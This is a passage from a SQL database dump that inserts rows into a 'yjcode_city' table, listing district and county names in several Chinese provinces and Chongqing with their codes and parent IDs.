(2118, '1411399', '其他区县', 3, '1415', 0),
(2119, '1411401', '梁园区', 3, '1412', 0),
(2120, '1411402', '睢阳区', 3, '1412', 0),
(2121, '1411403', '永城市', 3, '1412', 0),
(2122, '1411404', '虞城县', 3, '1412', 0),
(2123, '1411405', '民权县', 3, '1412', 0),
(2124, '1411406', '宁陵县', 3, '1412', 0),
(2125, '1411407', '睢县', 3, '1412', 0),
(2126, '1411408', '夏邑县', 3, '1412', 0),
(2127, '1411409', '柘城县', 3, '1412', 0),
(2128, '1411499', '其他区县', 3, '1412', 0),
(2129, '1411601', '川汇区', 3, '14116', 0),
(2130, '1411602', '项城市', 3, '14116', 0),
(2131, '1411603', '扶沟县', 3, '14116', 0),
(2132, '1411604', '西华县', 3, '14116', 0),
(2133, '1411605', '商水县', 3, '14116', 0),
(2134, '1411606', '太康县', 3, '14116', 0),
(2135, '1411607', '鹿邑县', 3, '14116', 0),
(2136, '1411608', '郸城县', 3, '14116', 0),
(2137, '1411609', '淮阳县', 3, '14116', 0),
(2138, '1411610', '沈丘县', 3, '14116', 0),
(2139, '1411699', '其他区县', 3, '14116', 0),
(2140, '1411701', '驿城区', 3, '1416', 0),
(2141, '1411702', '确山县', 3, '1416', 0),
(2142, '1411703', '泌阳县', 3, '1416', 0),
(2143, '1411704', '遂平县', 3, '1416', 0),
(2144, '1411705', '西平县', 3, '1416', 0),
(2145, '1411706', '上蔡县', 3, '1416', 0),
(2146, '1411707', '汝南县', 3, '1416', 0),
(2147, '1411708', '平舆县', 3, '1416', 0),
(2148, '1411709', '新蔡县', 3, '1416', 0),
(2149, '1411710', '正阳县', 3, '1416', 0),
(2150, '1411799', '其他区县', 3, '1416', 0),
(2151, '1420201', '黄石港区', 3, '1708', 0),
(2152, '1420202', '西塞山区', 3, '1708', 0),
(2153, '1420203', '下陆区', 3, '1708', 0),
(2154, '1420204', '铁山区', 3, '1708', 0),
(2155, '1420205', '大冶市', 3, '1708', 0),
(2156, '1420206', '阳新县', 3, '1708', 0),
(2157, '1420299', '其他区县', 3, '1708', 0),
(2158, '1420301', '襄城区', 3, '1706', 0),
(2159, '1420302', '樊城区', 3, '1706', 0),
(2160, '1420303', '襄阳区', 3, '1706', 0),
(2161, '1420304', '老河口市', 3, '1706', 0),
(2162, '1420305', '枣阳市', 3, '1706', 0),
(2163, '1420306', '宜城市', 3, '1706', 0),
(2164, '1420307', '南漳县', 3, '1706', 0),
(2165, '1420308', '谷城县', 3, '1706', 0),
(2166, '1420309', '保康县', 3, '1706', 0),
(2167, '1420399', '其他区县', 3, '1706', 0),
(2168, '1420401', '张湾区', 3, '1702', 0),
(2169, '1420402', '茅箭区', 3, '1702', 0),
(2170, '1420403', '丹江口市', 3, '1702', 0),
(2171, '1420404', '郧县', 3, '1702', 0),
(2172, '1420405', '竹山县', 3, '1702', 0),
(2173, '1420406', '房县', 3, '1702', 0),
(2174, '1420407', '郧西县', 3, '1702', 0),
(2175, '1420408', '竹溪县', 3, '1702', 0),
(2176, '1420499', '其他区县', 3, '1702', 0),
(2177, '1420509', '城南开发区', 3, '1714', 0),
(2178, '1420501', '沙市区', 3, '1714', 0),
(2179, '1420502', '荆州区', 3, '1714', 0),
(2180, '1420503', '石首市', 3, '1714', 0),
(2181, '1420504', '洪湖市', 3, '1714', 0),
(2182, '1420505', '松滋市', 3, '1714', 0),
(2183, '1420506', '江陵县', 3, '1714', 0),
(2184, '1420507', '公安县', 3, '1714', 0),
(2185, '1420508', '监利县', 3, '1714', 0),
(2186, '1420599', '其他区县', 3, '1714', 0),
(2187, '1420701', '东宝区', 3, '1704', 0),
(2188, '1420702', '掇刀区', 3, '1704', 0),
(2189, '1420703', '钟祥市', 3, '1704', 0),
(2190, '1420704', '沙洋县', 3, '1704', 0),
(2191, '1420705', '京山县', 3, '1704', 0),
(2192, '1420799', '其他区县', 3, '1704', 0),
(2193, '1420801', '鄂城区', 3, '1710', 0),
(2194, '1420802', '梁子湖区', 3, '1710', 0),
(2195, '1420803', '华容区', 3, '1710', 0),
(2196, '1420899', '其他区县', 3, '1710', 0),
(2197, '1420901', '孝南区', 3, '1705', 0),
(2198, '1420902', '应城市', 3, '1705', 0),
(2199, '1420903', '安陆市', 3, '1705', 0),
(2200, '1420904', '汉川市', 3, '1705', 0),
(2201, '1420905', '孝昌县', 3, '1705', 0),
(2202, '1420906', '大悟县', 3, '1705', 0),
(2203, '1420907', '云梦县', 3, '1705', 0),
(2204, '1420999', '其他区县', 3, '1705', 0),
(2205, '1421001', '黄州区', 3, '1712', 0),
(2206, '1421002', '麻城市', 3, '1712', 0),
(2207, '1711', '武穴市', 3, '1712', 0),
(2208, '1421004', '红安县', 3, '1712', 0),
(2209, '1421005', '罗田县', 3, '1712', 0),
(2210, '1421006', '英山县', 3, '1712', 0),
(2211, '1421007', '浠水县', 3, '1712', 0),
(2212, '1421008', '蕲春县', 3, '1712', 0),
(2213, '1421009', '黄梅县', 3, '1712', 0),
(2214, '1421010', '团风县', 3, '1712', 0),
(2215, '1421099', '其他区县', 3, '1712', 0),
(2216, '1421101', '咸安区', 3, '1713', 0),
(2217, '1421102', '赤壁市', 3, '1713', 0),
(2218, '1421103', '嘉鱼县', 3, '1713', 0),
(2219, '1421104', '通城县', 3, '1713', 0),
(2220, '1421105', '崇阳县', 3, '1713', 0),
(2221, '1421106', '通山县', 3, '1713', 0),
(2222, '1421199', '其他区县', 3, '1713', 0),
(2223, '1421201', '曾都区', 3, '14212', 0),
(2224, '1421202', '广水市', 3, '14212', 0),
(2225, '1421299', '其他区县', 3, '14212', 0),
(2226, '1421301', '恩施市', 3, '14213', 0),
(2227, '1421302', '利川市', 3, '14213', 0),
(2228, '1421303', '建始县', 3, '14213', 0),
(2229, '1421304', '巴东县', 3, '14213', 0),
(2230, '1421305', '宣恩县', 3, '14213', 0),
(2231, '1421306', '咸丰县', 3, '14213', 0),
(2232, '1421307', '来凤县', 3, '14213', 0),
(2233, '1421308', '鹤峰县', 3, '14213', 0),
(2234, '1421399', '其他区县', 3, '14213', 0),
(2235, '1430101', '岳麓区', 3, '1801', 0),
(2236, '1430102', '芙蓉区', 3, '1801', 0),
(2237, '1430103', '天心区', 3, '1801', 0),
(2238, '1430104', '开福区', 3, '1801', 0),
(2239, '1430105', '雨花区', 3, '1801', 0),
(2240, '1430106', '浏阳市', 3, '1801', 0),
(2241, '1430107', '长沙县', 3, '1801', 0),
(2242, '1430108', '望城县', 3, '1801', 0),
(2243, '1430109', '宁乡县', 3, '1801', 0),
(2244, '1430199', '其他区县', 3, '1801', 0),
(2245, '1430201', '天元区', 3, '1811', 0),
(2246, '1430202', '荷塘区', 3, '1811', 0),
(2247, '1430203', '芦淞区', 3, '1811', 0),
(2248, '1430204', '石峰区', 3, '1811', 0),
(2249, '1430205', '醴陵市', 3, '1811', 0),
(2250, '1430206', '株洲县', 3, '1811', 0),
(2251, '1430207', '攸县', 3, '1811', 0),
(2252, '1430208', '茶陵县', 3, '1811', 0),
(2253, '1430209', '炎陵县', 3, '1811', 0),
(2254, '1430299', '其他区县', 3, '1811', 0),
(2255, '1430301', '岳塘区', 3, '1803', 0),
(2256, '1430302', '雨湖区', 3, '1803', 0),
(2257, '1430303', '湘乡市', 3, '1803', 0),
(2258, '1430304', '韶山市', 3, '1803', 0),
(2259, '1430305', '湘潭县', 3, '1803', 0),
(2260, '1430399', '其他区县', 3, '1803', 0),
(2261, '1430401', '雁峰区', 3, '1808', 0),
(2262, '1430402', '珠晖区', 3, '1808', 0),
(2263, '1430403', '石鼓区', 3, '1808', 0),
(2264, '1430404', '蒸湘区', 3, '1808', 0),
(2265, '1430405', '南岳区', 3, '1808', 0),
(2266, '1430406', '常宁市', 3, '1808', 0),
(2267, '1430407', '耒阳市', 3, '1808', 0),
(2268, '1430408', '衡阳县', 3, '1808', 0),
(2269, '1430409', '衡南县', 3, '1808', 0),
(2270, '1430410', '衡山县', 3, '1808', 0),
(2271, '1430411', '衡东县', 3, '1808', 0),
(2272, '1430412', '祁东县', 3, '1808', 0),
(2273, '1430499', '其他区县', 3, '1808', 0),
(2274, '1430501', '双清区', 3, '1810', 0),
(2275, '1430502', '大祥区', 3, '1810', 0),
(2276, '1430503', '北塔区', 3, '1810', 0),
(2277, '1430504', '武冈市', 3, '1810', 0),
(2278, '1430505', '邵东县', 3, '1810', 0),
(2279, '1430506', '邵阳县', 3, '1810', 0),
(2280, '1430507', '新邵县', 3, '1810', 0),
(2281, '1430508', '隆回县', 3, '1810', 0),
(2282, '1430509', '洞口县', 3, '1810', 0),
(2283, '1430510', '绥宁县', 3, '1810', 0),
(2284, '1430511', '新宁县', 3, '1810', 0),
(2285, '1430512', '城步苗族自治县', 3, '1810', 0),
(2286, '1430599', '其他区县', 3, '1810', 0),
(2287, '1430601', '岳阳楼区', 3, '1807', 0),
(2288, '1430602', '君山区', 3, '1807', 0),
(2289, '1430603', '云溪区', 3, '1807', 0),
(2290, '1430604', '汨罗市', 3, '1807', 0),
(2291, '1430605', '临湘市', 3, '1807', 0),
(2292, '1430606', '岳阳县', 3, '1807', 0),
(2293, '1430607', '华容县', 3, '1807', 0),
(2294, '1430608', '湘阴县', 3, '1807', 0),
(2295, '1430609', '平江县', 3, '1807', 0),
(2296, '1430699', '其他区县', 3, '1807', 0),
(2297, '1430701', '武陵区', 3, '1805', 0),
(2298, '1430702', '鼎城区', 3, '1805', 0),
(2299, '1430703', '津市市', 3, '1805', 0),
(2300, '1430704', '安乡县', 3, '1805', 0),
(2301, '1430705', '汉寿县', 3, '1805', 0),
(2302, '1430706', '澧县', 3, '1805', 0),
(2303, '1430707', '临澧县', 3, '1805', 0),
(2304, '1430708', '桃源县', 3, '1805', 0),
(2305, '1430709', '石门县', 3, '1805', 0),
(2306, '1430799', '其他区县', 3, '1805', 0),
(2307, '1430801', '永定区', 3, '1802', 0),
(2308, '1430802', '武陵源区', 3, '1802', 0),
(2309, '1430803', '慈利县', 3, '1802', 0),
(2310, '1430804', '桑植县', 3, '1802', 0);
INSERT INTO `yjcode_city` (`id`, `bh`, `name1`, `level`, `parentid`, `xh`) VALUES
(2311, '1430899', '其他区县', 3, '1802', 0),
(2312, '1430901', '赫山区', 3, '1806', 0),
(2313, '1430902', '资阳区', 3, '1806', 0),
(2314, '1430903', '沅江市', 3, '1806', 0),
(2315, '1430904', '南县', 3, '1806', 0),
(2316, '1430905', '桃江县', 3, '1806', 0),
(2317, '1430906', '安化县', 3, '1806', 0),
(2318, '1430999', '其他区县', 3, '1806', 0),
(2319, '1431001', '北湖区', 3, '1809', 0),
(2320, '1431002', '苏仙区', 3, '1809', 0),
(2321, '1431003', '资兴市', 3, '1809', 0),
(2322, '1431004', '桂阳县', 3, '1809', 0),
(2323, '1431005', '永兴县', 3, '1809', 0),
(2324, '1431006', '宜章县', 3, '1809', 0),
(2325, '1431007', '嘉禾县', 3, '1809', 0),
(2326, '1431008', '临武县', 3, '1809', 0),
(2327, '1431009', '汝城县', 3, '1809', 0),
(2328, '1431010', '桂东县', 3, '1809', 0),
(2329, '1431011', '安仁县', 3, '1809', 0),
(2330, '1431099', '其他区县', 3, '1809', 0),
(2331, '1431101', '冷水滩区', 3, '14311', 0),
(2332, '1431102', '零陵区', 3, '14311', 0),
(2333, '1431103', '东安县', 3, '14311', 0),
(2334, '1431104', '道县', 3, '14311', 0),
(2335, '1431105', '宁远县', 3, '14311', 0),
(2336, '1431106', '江永县', 3, '14311', 0),
(2337, '1431107', '蓝山县', 3, '14311', 0),
(2338, '1431108', '新田县', 3, '14311', 0),
(2339, '1431109', '双牌县', 3, '14311', 0),
(2340, '1431110', '祁阳县', 3, '14311', 0),
(2341, '1431111', '江华瑶族自治县', 3, '14311', 0),
(2342, '1431199', '其他区县', 3, '14311', 0),
(2343, '1431112', '芝山区', 3, '14311', 0),
(2344, '1431201', '鹤城区', 3, '1804', 0),
(2345, '1431202', '洪江市', 3, '1804', 0),
(2346, '1431203', '沅陵县', 3, '1804', 0),
(2347, '1431204', '辰溪县', 3, '1804', 0),
(2348, '1431205', '溆浦县', 3, '1804', 0),
(2349, '1431206', '中方县', 3, '1804', 0),
(2350, '1431207', '会同县', 3, '1804', 0),
(2351, '1431208', '麻阳苗族自治县', 3, '1804', 0),
(2352, '1431209', '新晃侗族自治县', 3, '1804', 0),
(2353, '1431210', '芷江侗族自治县', 3, '1804', 0),
(2354, '1431211', '靖州苗族侗族自治县', 3, '1804', 0),
(2355, '1431212', '通道侗族自治县', 3, '1804', 0),
(2356, '1431299', '其他区县', 3, '1804', 0),
(2357, '1431301', '娄星区', 3, '1812', 0),
(2358, '1431302', '冷水江市', 3, '1812', 0),
(2359, '1431303', '涟源市', 3, '1812', 0),
(2360, '1431304', '双峰县', 3, '1812', 0),
(2361, '1431305', '新化县', 3, '1812', 0),
(2362, '1431399', '其他区县', 3, '1812', 0),
(2363, '1431401', '吉首市', 3, '14314', 0),
(2364, '1431402', '泸溪县', 3, '14314', 0),
(2365, '1431403', '凤凰县', 3, '14314', 0),
(2366, '1431404', '花垣县', 3, '14314', 0),
(2367, '1431405', '保靖县', 3, '14314', 0),
(2368, '1431406', '古丈县', 3, '14314', 0),
(2369, '1431407', '永顺县', 3, '14314', 0),
(2370, '1431408', '龙山县', 3, '14314', 0),
(2371, '1431499', '其他区县', 3, '14314', 0),
(2372, '1440108', '萝岗区', 3, '5', 0),
(2373, '1440109', '南沙区', 3, '5', 0),
(2374, '1440101', '越秀区', 3, '5', 0),
(2375, '1440102', '东山区', 3, '5', 0),
(2376, '1440103', '荔湾区', 3, '5', 0),
(2377, '1440104', '海珠区', 3, '5', 0),
(2378, '1440105', '天河区', 3, '5', 0),
(2379, '1440106', '芳村区', 3, '5', 0),
(2380, '1440107', '白云区', 3, '5', 0),
(2381, '535', '黄埔区', 3, '5', 0),
(2382, '514', '番禺区', 3, '5', 0),
(2383, '505', '花都区', 3, '5', 0),
(2384, '519', '增城市', 3, '5', 0),
(2385, '518', '从化市', 3, '5', 0),
(2386, '1440201', '福田区', 3, '7', 0),
(2387, '1440202', '罗湖区', 3, '7', 0),
(2388, '1440203', '南山区', 3, '7', 0),
(2389, '1440204', '宝安区', 3, '7', 0),
(2390, '1440205', '龙岗区', 3, '7', 0),
(2391, '1440206', '盐田区', 3, '7', 0),
(2392, '1440301', '香洲区', 3, '504', 0),
(2393, '1440302', '斗门区', 3, '504', 0),
(2394, '1440303', '金湾区', 3, '504', 0),
(2395, '1440399', '其他区县', 3, '504', 0),
(2396, '1440401', '金平区', 3, '507', 0),
(2397, '1440402', '濠江区', 3, '507', 0),
(2398, '1440403', '龙湖区', 3, '507', 0),
(2399, '542', '潮阳区', 3, '507', 0),
(2400, '560', '潮南区', 3, '507', 0),
(2401, '1440406', '澄海区', 3, '507', 0),
(2402, '1440407', '南澳县', 3, '507', 0),
(2403, '1440499', '其他区县', 3, '507', 0),
(2404, '1440501', '浈江区', 3, '533', 0),
(2405, '1440502', '武江区', 3, '533', 0),
(2406, '1440503', '曲江区', 3, '533', 0),
(2407, '1440504', '乐昌市', 3, '533', 0),
(2408, '1440505', '南雄市', 3, '533', 0),
(2409, '1440506', '始兴县', 3, '533', 0),
(2410, '1440507', '仁化县', 3, '533', 0),
(2411, '1440508', '翁源县', 3, '533', 0),
(2412, '1440509', '新丰县', 3, '533', 0),
(2413, '1440510', '乳源瑶族自治县', 3, '533', 0),
(2414, '1440599', '其他区县', 3, '533', 0),
(2415, '1440601', '禅城区', 3, '521', 0),
(2416, '517', '南海区', 3, '521', 0),
(2417, '513', '顺德区', 3, '521', 0),
(2418, '527', '三水区', 3, '521', 0),
(2419, '522', '高明区', 3, '521', 0),
(2420, '1440699', '其他区县', 3, '521', 0),
(2421, '1440701', '江海区', 3, '509', 0),
(2422, '1440702', '蓬江区', 3, '509', 0),
(2423, '520', '新会区', 3, '509', 0),
(2424, '528', '恩平市', 3, '509', 0),
(2425, '524', '台山市', 3, '509', 0),
(2426, '525', '开平市', 3, '509', 0),
(2427, '523', '鹤山市', 3, '509', 0),
(2428, '1440799', '其他区县', 3, '509', 0),
(2429, '1440801', '赤坎区', 3, '516', 0),
(2430, '1440802', '霞山区', 3, '516', 0),
(2431, '1440803', '坡头区', 3, '516', 0),
(2432, '1440804', '麻章区', 3, '516', 0),
(2433, '1440805', '吴川市', 3, '516', 0),
(2434, '1440806', '廉江市', 3, '516', 0),
(2435, '1440807', '雷州市', 3, '516', 0),
(2436, '1440808', '遂溪县', 3, '516', 0),
(2437, '1440809', '徐闻县', 3, '516', 0),
(2438, '1440899', '其他区县', 3, '516', 0),
(2439, '1440901', '茂南区', 3, '511', 0),
(2440, '1440902', '茂港区', 3, '511', 0),
(2441, '1440903', '化州市', 3, '511', 0),
(2442, '1440904', '信宜市', 3, '511', 0),
(2443, '1440905', '高州市', 3, '511', 0),
(2444, '1440906', '电白县', 3, '511', 0),
(2445, '1440999', '其他区县', 3, '511', 0),
(2446, '1441001', '端州区', 3, '534', 0),
(2447, '1441002', '鼎湖区', 3, '534', 0),
(2448, '1441003', '高要市', 3, '534', 0),
(2449, '526', '四会市', 3, '534', 0),
(2450, '1441005', '广宁县', 3, '534', 0),
(2451, '1441006', '怀集县', 3, '534', 0),
(2452, '1441007', '封开县', 3, '534', 0),
(2453, '1441008', '德庆县', 3, '534', 0),
(2454, '1441099', '其他区县', 3, '534', 0),
(2455, '1441101', '惠城区', 3, '508', 0),
(2456, '1441102', '惠阳区', 3, '508', 0),
(2457, '543', '博罗县', 3, '508', 0),
(2458, '1441104', '惠东县', 3, '508', 0),
(2459, '1441105', '龙门县', 3, '508', 0),
(2460, '537', '陈江', 3, '508', 0),
(2461, '1441199', '其他区县', 3, '508', 0),
(2462, '1441106', '大亚湾区', 3, '508', 0),
(2463, '1441201', '梅江区', 3, '545', 0),
(2464, '493', '兴宁市', 3, '545', 0),
(2465, '491', '梅县', 3, '545', 0),
(2466, '548', '大埔县', 3, '545', 0),
(2467, '550', '丰顺县', 3, '545', 0),
(2468, '552', '五华县', 3, '545', 0),
(2469, '554', '平远县', 3, '545', 0),
(2470, '492', '蕉岭县', 3, '545', 0),
(2471, '1441299', '其他区县', 3, '545', 0),
(2472, '1441301', '城区', 3, '529', 0),
(2473, '499', '陆丰市', 3, '529', 0),
(2474, '530', '海丰县', 3, '529', 0),
(2475, '495', '陆河县', 3, '529', 0),
(2476, '1441399', '其他区县', 3, '529', 0),
(2477, '1441501', '源城区', 3, '544', 0),
(2478, '498', '紫金县', 3, '544', 0),
(2479, '500', '龙川县', 3, '544', 0),
(2480, '496', '连平县', 3, '544', 0),
(2481, '501', '和平县', 3, '544', 0),
(2482, '494', '东源县', 3, '544', 0),
(2483, '1441599', '其他区县', 3, '544', 0),
(2484, '1441601', '江城区', 3, '531', 0),
(2485, '539', '阳春市', 3, '531', 0),
(2486, '532', '阳西县', 3, '531', 0),
(2487, '538', '阳东县', 3, '531', 0),
(2488, '1441699', '其他区县', 3, '531', 0),
(2489, '1441701', '清城区', 3, '512', 0),
(2490, '551', '英德市', 3, '512', 0),
(2491, '555', '连州市', 3, '512', 0),
(2492, '549', '佛冈县', 3, '512', 0),
(2493, '553', '阳山县', 3, '512', 0),
(2494, '547', '清新县', 3, '512', 0),
(2495, '559', '连山壮族瑶族自治县', 3, '512', 0),
(2496, '557', '连南瑶族自治县', 3, '512', 0),
(2497, '1441799', '其他区县', 3, '512', 0),
(2498, '1441804', '东城区', 3, '510', 0),
(2499, '1441802', '南城区', 3, '510', 0),
(2500, '1441805', '市辖镇', 3, '510', 0),
(2501, '1441801', '莞城区', 3, '510', 0),
(2502, '1441803', '万江区', 3, '510', 0),
(2503, '1441901', '东区', 3, '515', 0),
(2504, '1441905', '火炬开发区', 3, '515', 0),
(2505, '1441903', '南区', 3, '515', 0),
(2506, '1441904', '石岐区', 3, '515', 0),
(2507, '1441906', '市辖镇', 3, '515', 0),
(2508, '1441902', '西区', 3, '515', 0),
(2509, '1442001', '湘桥区', 3, '506', 0),
(2510, '1442002', '潮安县', 3, '506', 0),
(2511, '1442003', '饶平县', 3, '506', 0),
(2512, '1442099', '其他区县', 3, '506', 0),
(2513, '1442101', '榕城区', 3, '540', 0),
(2514, '541', '普宁市', 3, '540', 0),
(2515, '1442103', '揭东县', 3, '540', 0),
(2516, '1442104', '揭西县', 3, '540', 0),
(2517, '1442105', '惠来县', 3, '540', 0),
(2518, '1442199', '其他区县', 3, '540', 0),
(2519, '1442201', '云城区', 3, '546', 0),
(2520, '556', '罗定市', 3, '546', 0),
(2521, '558', '云安县', 3, '546', 0),
(2522, '503', '新兴县', 3, '546', 0),
(2523, '502', '郁南县', 3, '546', 0),
(2524, '1442299', '其他区县', 3, '546', 0),
(2525, '1450101', '青秀区', 3, '2201', 0),
(2526, '1450102', '兴宁区', 3, '2201', 0),
(2527, '1450103', '江南区', 3, '2201', 0),
(2528, '1450104', '西乡塘区', 3, '2201', 0),
(2529, '1450105', '良庆区', 3, '2201', 0),
(2530, '1450106', '邕宁区', 3, '2201', 0),
(2531, '1450107', '武鸣县', 3, '2201', 0),
(2532, '1450108', '横县', 3, '2201', 0),
(2533, '1450109', '宾阳县', 3, '2201', 0),
(2534, '1450110', '上林县', 3, '2201', 0),
(2535, '1450111', '隆安县', 3, '2201', 0),
(2536, '1450112', '马山县', 3, '2201', 0),
(2537, '1450199', '其他区县', 3, '2201', 0),
(2538, '1450211', '高新区', 3, '2203', 0),
(2539, '1450201', '城中区', 3, '2203', 0),
(2540, '1450202', '鱼峰区', 3, '2203', 0),
(2541, '1450203', '柳南区', 3, '2203', 0),
(2542, '1450204', '柳北区', 3, '2203', 0),
(2543, '1450205', '柳江县', 3, '2203', 0),
(2544, '1450206', '柳城县', 3, '2203', 0),
(2545, '1450207', '鹿寨县', 3, '2203', 0),
(2546, '1450208', '融安县', 3, '2203', 0),
(2547, '1450209', '三江侗族自治县', 3, '2203', 0),
(2548, '1450210', '融水苗族自治县', 3, '2203', 0),
(2549, '1450299', '其他区县', 3, '2203', 0),
(2550, '1450301', '象山区', 3, '2202', 0),
(2551, '1450302', '叠彩区', 3, '2202', 0),
(2552, '1450303', '秀峰区', 3, '2202', 0),
(2553, '1450304', '七星区', 3, '2202', 0),
(2554, '1450305', '雁山区', 3, '2202', 0),
(2555, '1450306', '阳朔县', 3, '2202', 0),
(2556, '1450307', '临桂县', 3, '2202', 0),
(2557, '1450308', '灵川县', 3, '2202', 0),
(2558, '1450309', '全州县', 3, '2202', 0),
(2559, '1450310', '兴安县', 3, '2202', 0),
(2560, '1450311', '永福县', 3, '2202', 0),
(2561, '1450312', '灌阳县', 3, '2202', 0),
(2562, '1450313', '资源县', 3, '2202', 0),
(2563, '1450314', '平乐县', 3, '2202', 0),
(2564, '1450315', '荔浦县', 3, '2202', 0),
(2565, '1450316', '龙胜各族自治县', 3, '2202', 0),
(2566, '1450317', '恭城瑶族自治县', 3, '2202', 0),
(2567, '1450399', '其他区县', 3, '2202', 0),
(2568, '1450401', '万秀区', 3, '2204', 0),
(2569, '1450402', '蝶山区', 3, '2204', 0),
(2570, '1450403', '长洲区', 3, '2204', 0),
(2571, '1450404', '岑溪市', 3, '2204', 0),
(2572, '1450405', '苍梧县', 3, '2204', 0),
(2573, '1450406', '藤县', 3, '2204', 0),
(2574, '1450407', '蒙山县', 3, '2204', 0),
(2575, '1450499', '其他区县', 3, '2204', 0),
(2576, '1450501', '海城区', 3, '2206', 0),
(2577, '1450502', '银海区', 3, '2206', 0),
(2578, '1450503', '铁山港区', 3, '2206', 0),
(2579, '1450504', '合浦县', 3, '2206', 0),
(2580, '1450599', '其他区县', 3, '2206', 0),
(2581, '1450601', '港口区', 3, '14506', 0),
(2582, '1450602', '防城区', 3, '14506', 0),
(2583, '1450603', '东兴市', 3, '14506', 0),
(2584, '1450604', '上思县', 3, '14506', 0),
(2585, '1450699', '其他区县', 3, '14506', 0),
(2586, '1450701', '钦南区', 3, '2205', 0),
(2587, '1450702', '钦北区', 3, '2205', 0),
(2588, '1450703', '灵山县', 3, '2205', 0),
(2589, '1450704', '浦北县', 3, '2205', 0),
(2590, '1450799', '其他区县', 3, '2205', 0),
(2591, '1450801', '港北区', 3, '14508', 0),
(2592, '1450802', '港南区', 3, '14508', 0),
(2593, '1450803', '覃塘区', 3, '14508', 0),
(2594, '1450804', '桂平市', 3, '14508', 0),
(2595, '1450805', '平南县', 3, '14508', 0),
(2596, '1450899', '其他区县', 3, '14508', 0),
(2597, '1450907', '开发区', 3, '2207', 0),
(2598, '1450901', '玉州区', 3, '2207', 0),
(2599, '1450902', '北流市', 3, '2207', 0),
(2600, '1450903', '兴业县', 3, '2207', 0),
(2601, '1450904', '容县', 3, '2207', 0),
(2602, '1450905', '陆川县', 3, '2207', 0),
(2603, '1450906', '博白县', 3, '2207', 0),
(2604, '1450999', '其他区县', 3, '2207', 0),
(2605, '1451001', '右江区', 3, '14510', 0),
(2606, '1451002', '田阳县', 3, '14510', 0),
(2607, '1451003', '田东县', 3, '14510', 0),
(2608, '1451004', '平果县', 3, '14510', 0),
(2609, '1451005', '德保县', 3, '14510', 0),
(2610, '1451006', '靖西县', 3, '14510', 0),
(2611, '1451007', '那坡县', 3, '14510', 0),
(2612, '1451008', '凌云县', 3, '14510', 0),
(2613, '1451009', '乐业县', 3, '14510', 0),
(2614, '1451010', '西林县', 3, '14510', 0),
(2615, '1451011', '田林县', 3, '14510', 0),
(2616, '1451012', '隆林各族自治县', 3, '14510', 0),
(2617, '1451099', '其他区县', 3, '14510', 0),
(2618, '1451101', '八步区', 3, '14511', 0),
(2619, '1451102', '昭平县', 3, '14511', 0),
(2620, '1451103', '钟山县', 3, '14511', 0),
(2621, '1451104', '富川瑶族自治县', 3, '14511', 0),
(2622, '1451199', '其他区县', 3, '14511', 0),
(2623, '1451212', '城中区', 3, '14512', 0),
(2624, '1451213', '河北区', 3, '14512', 0),
(2625, '1451201', '金城江区', 3, '14512', 0),
(2626, '1451202', '宜州市', 3, '14512', 0),
(2627, '1451203', '南丹县', 3, '14512', 0),
(2628, '1451204', '天峨县', 3, '14512', 0),
(2629, '1451205', '凤山县', 3, '14512', 0),
(2630, '1451206', '东兰县', 3, '14512', 0),
(2631, '1451207', '巴马瑶族自治县', 3, '14512', 0),
(2632, '1451208', '都安瑶族自治县', 3, '14512', 0),
(2633, '1451209', '大化瑶族自治县', 3, '14512', 0),
(2634, '1451210', '罗城仫佬族自治县', 3, '14512', 0),
(2635, '1451211', '环江毛南族自治县', 3, '14512', 0),
(2636, '1451299', '其他区县', 3, '14512', 0),
(2637, '1451301', '兴宾区', 3, '14513', 0),
(2638, '1451302', '合山市', 3, '14513', 0),
(2639, '1451303', '象州县', 3, '14513', 0),
(2640, '1451304', '武宣县', 3, '14513', 0),
(2641, '1451305', '忻城县', 3, '14513', 0),
(2642, '1451306', '金秀瑶族自治县', 3, '14513', 0),
(2643, '1451399', '其他区县', 3, '14513', 0),
(2644, '1451401', '江州区', 3, '14514', 0),
(2645, '1451402', '凭祥市', 3, '14514', 0),
(2646, '1451403', '扶绥县', 3, '14514', 0),
(2647, '1451404', '大新县', 3, '14514', 0),
(2648, '1451405', '天等县', 3, '14514', 0),
(2649, '1451406', '宁明县', 3, '14514', 0),
(2650, '1451407', '龙州县', 3, '14514', 0),
(2651, '1451499', '其他区县', 3, '14514', 0),
(2652, '1460101', '龙华区', 3, '2301', 0),
(2653, '1460102', '秀英区', 3, '2301', 0),
(2654, '1460103', '琼山区', 3, '2301', 0),
(2655, '1460104', '美兰区', 3, '2301', 0),
(2656, '1460199', '其他区县', 3, '2301', 0),
(2657, '1500141', '高新区', 3, '401', 0),
(2658, '1500101', '渝中区', 3, '401', 0),
(2659, '1500102', '大渡口区', 3, '401', 0),
(2660, '1500103', '江北区', 3, '401', 0),
(2661, '1500104', '沙坪坝区', 3, '401', 0),
(2662, '1500105', '九龙坡区', 3, '401', 0),
(2663, '1500106', '南岸区', 3, '401', 0),
(2664, '1500107', '北碚区', 3, '401', 0),
(2665, '1500108', '万盛区', 3, '401', 0),
(2666, '1500109', '双桥区', 3, '401', 0),
(2667, '1500110', '渝北区', 3, '401', 0),
(2668, '1500111', '巴南区', 3, '401', 0),
(2669, '1500112', '万州区', 3, '401', 0),
(2670, '1500113', '涪陵区', 3, '401', 0),
(2671, '1500114', '黔江区', 3, '401', 0),
(2672, '1500115', '长寿区', 3, '401', 0),
(2673, '1500116', '江津区', 3, '401', 0),
(2674, '1500117', '合川区', 3, '401', 0),
(2675, '1500118', '永川区', 3, '401', 0),
(2676, '1500119', '南川区', 3, '401', 0),
(2677, '1500120', '綦江县', 3, '401', 0),
(2678, '1500121', '潼南县', 3, '401', 0),
(2679, '1500122', '铜梁县', 3, '401', 0),
(2680, '1500123', '大足县', 3, '401', 0),
(2681, '1500124', '荣昌县', 3, '401', 0),
(2682, '1500125', '璧山县', 3, '401', 0),
(2683, '1500126', '垫江县', 3, '401', 0),
(2684, '1500127', '武隆县', 3, '401', 0),
(2685, '1500128', '丰都县', 3, '401', 0),
(2686, '1500129', '城口县', 3, '401', 0),
(2687, '1500130', '梁平县', 3, '401', 0),
(2688, '1500131', '开县', 3, '401', 0),
(2689, '1500132', '巫溪县', 3, '401', 0),
(2690, '1500133', '巫山县', 3, '401', 0),
(2691, '1500134', '奉节县', 3, '401', 0),
(2692, '1500135', '云阳县', 3, '401', 0),
(2693, '1500136', '忠县', 3, '401', 0),
(2694, '1500137', '石柱县', 3, '401', 0),
(2695, '1500138', '彭水县', 3, '401', 0),
(2696, '1500139', '酉阳县', 3, '401', 0),
(2697, '1500140', '秀山县', 3, '401', 0),
(2698, '1500199', '其他区县', 3, '401', 0),
(2699, '1510120', '高新区', 3, '3001', 0),
